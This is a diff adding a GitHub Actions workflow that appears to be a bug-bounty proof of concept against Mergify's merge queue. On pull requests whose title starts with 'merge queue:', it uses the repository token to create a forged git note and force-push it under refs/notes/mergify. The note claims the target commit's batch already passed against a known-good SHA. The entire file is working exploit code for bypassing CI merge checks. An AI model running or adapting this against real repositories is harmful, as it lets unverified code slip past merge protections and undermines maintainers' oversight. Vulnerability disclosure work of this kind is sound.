@@ -1,0 +1,41 @@
+name: h1lab-forge-queue-note
+
+on:
+  pull_request:
+
+permissions:
+  contents: write
+
+jobs:
+  forge:
+    if: startsWith(github.event.pull_request.title, 'merge queue:')
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create a competing Mergify note
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          TARGET_SHA: ${{ github.event.pull_request.head.sha }}
+          KNOWN_SUCCESS_SHA: e691904f23b02af5bdf2a1546183828294c19f87
+        run: |
+          note=$(printf '%s\n' \
+            "checking_base_sha: $TARGET_SHA" \
+            "previous_check_retries: []" \
+            "previous_failed_batches:" \
+            "  - batch_pr_head_sha: $KNOWN_SUCCESS_SHA")
+          blob=$(jq -n --arg content "$note" \
+            '{content: $content, encoding: "utf-8"}' \
+            | gh api --method POST "repos/$REPO/git/blobs" \
+                --input - --jq .sha)
+          tree=$(jq -n --arg path "$TARGET_SHA" --arg sha "$blob" \
+            '{tree: [{path: $path, mode: "100644", type: "blob", sha: $sha}]}' \
+            | gh api --method POST "repos/$REPO/git/trees" \
+                --input - --jq .sha)
+          commit=$(jq -n --arg tree "$tree" \
+            '{message: "h1lab owned note control", tree: $tree, parents: []}' \
+            | gh api --method POST "repos/$REPO/git/commits" \
+                --input - --jq .sha)
+          jq -n --arg sha "$commit" '{sha: $sha, force: true}' \
+            | gh api --method PATCH \
+                "repos/$REPO/git/refs/notes/mergify/000-attacker" \
+                --input - >/dev/null
